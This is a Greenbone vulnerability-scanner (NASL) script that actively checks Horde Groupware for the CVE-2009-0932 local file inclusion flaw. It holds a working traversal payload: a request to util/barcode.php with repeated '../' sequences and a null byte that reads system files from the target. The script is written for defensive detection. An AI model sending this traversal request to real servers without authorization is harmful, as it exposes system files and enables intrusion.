# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:horde:horde_groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801849");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

  script_cve_id("CVE-2009-0932");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Horde LFI Vulnerability (Feb 2012) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("horde_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("horde/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Horde is prone to local file inclusion (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied
  input to the 'driver' argument of the 'Horde_Image::factory' method before using it to include
  PHP code in 'lib/Horde/Image.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to include
  and execute arbitrary local files via directory traversal sequences in the Horde_Image driver
  name.");

  script_tag(name:"affected", value:"Horde prior to version 3.2.4 and  3.3.x prior to 3.3.3.");

  script_tag(name:"solution", value:"Update to version 3.2.4, 3.3.3 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/33695");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33491");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98424/horde-lfi.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern (keys(files)) {

  file = files[pattern];
  url = dir + "/util/barcode.php?type=../../../../../../../../../../../" + file + "%00";

  if (http_vuln_check(port:port, url:url, pattern:pattern, check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
